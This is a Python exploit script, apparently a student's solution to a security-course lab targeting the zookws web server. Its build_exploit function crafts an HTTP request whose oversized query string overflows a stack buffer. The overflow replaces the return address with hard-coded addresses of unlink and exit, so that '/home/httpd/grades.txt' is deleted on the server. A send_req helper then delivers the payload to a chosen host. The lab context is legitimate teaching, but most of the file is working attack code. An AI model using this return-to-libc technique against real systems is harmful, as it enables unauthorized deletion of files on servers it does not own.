#!/usr/bin/python
import sys
import socket
import traceback
import urllib
import struct
import time
import binascii
####

## You might find it useful to define variables that store various
## stack or function addresses from the zookd / zookfs processes,
## which you can then use in build_exploit(); the following are just
## examples.

stack_buffer = 0xbfffe608
stack_saved_ebp = 0xbffff618
stack_retaddr = stack_saved_ebp + 4
unlink_addr = 0x40102450
exit_addr = 0x40058150

## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.

def build_exploit(shellcode):
    ## Things that you might find useful in constructing your exploit:
    ##   urllib.quote(s)
    ##     returns string s with "special" characters percent-encoded
    ##   struct.pack("<I", x)
    ##     returns the 4-byte binary encoding of the 32-bit integer x
    ##   variables for program addresses (ebp, buffer, retaddr=ebp+4)

    #overflow attack using query_string in url
    # Basic idea is to put "/home/httpd/grades.txt" at the value of SERVER_PROTOCOL in env buffer which is
    # followed by a null character in http_request_line function.
    
    env_buffer = "REQUEST_METHOD=GET\000SERVER_PROTOCOL=\000QUERY_STRING="
    arg_addr = binascii.unhexlify(hex(stack_buffer + 35)[2:10])[::-1]     # 0xbfffe608 + 35 = 0xbfffe62b
    unlink_arg = "/home/httpd/grades.txt"
    fillup = stack_retaddr - stack_buffer -len(env_buffer) - len(unlink_arg)
    print("FILLUP: ", fillup)
    req = "GET /?"
    req +=  "A"*fillup + binascii.unhexlify(hex(unlink_addr)[2:10])[::-1] + binascii.unhexlify(hex(exit_addr)[2:10])[::-1] + arg_addr
    req += " " + unlink_arg + "\r\n" + \
          "\r\n"
    return req

####

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""
    while len(rbuf):
	resp = resp + rbuf
	rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "r")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())
